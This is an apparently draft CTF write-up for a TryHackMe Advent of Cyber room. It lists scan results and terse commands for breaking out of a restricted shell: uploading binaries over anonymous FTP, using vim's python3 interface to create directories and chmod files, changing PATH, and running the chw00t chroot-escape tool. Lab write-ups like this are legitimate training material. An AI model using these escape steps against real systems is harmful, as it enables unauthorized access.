---
title: Advent Of Cyber (sq3)
author: reds
date: 2023-12-14 15:03
tags: [cybersecurity, ctf, writeup, TryHackMe, virtualization]
draft: true
---

# Frosteau Busy with Vim

ROOM: https://tryhackme.com/jr/busyvimfrosteau

## Nmap
- 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
- 80/tcp   open  http    WebSockify Python/3.8.10
- 8065/tcp open  telnet
- 8075/tcp open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
  - anonymous FTP login allowed
- 8085/tcp open  telnet (vim)
- 8095/tcp open  telnet (nano)

## Jailbreak 


```
# ftp (at /tmp/ftp)
put localFilePath remoteFileName
# with vim u rename it (move it)
# new file
:open("your_file_path_here", 'w').close()
# new dir
:python3 import os; os.makedirs("/tmp/bin")
# chmod
:python3 import os; os.chmod("/tmp/sh", 0o777)
# add to path
PATH=/tmp/bin:$PATH
```

```
# at 8087
put /usr/bin/chmod chmod
# at 8085
:e /tmp/ftp
R
Moving /tmp/ftp/chmod to : /tmp/bin/chmod
:python3 import os; os.chmod("/tmp/bin/chmod", 0o777)
# at 8065
PATH=/tmp/bin:$PATH
```

`chw00t -3 --dir /proc/1`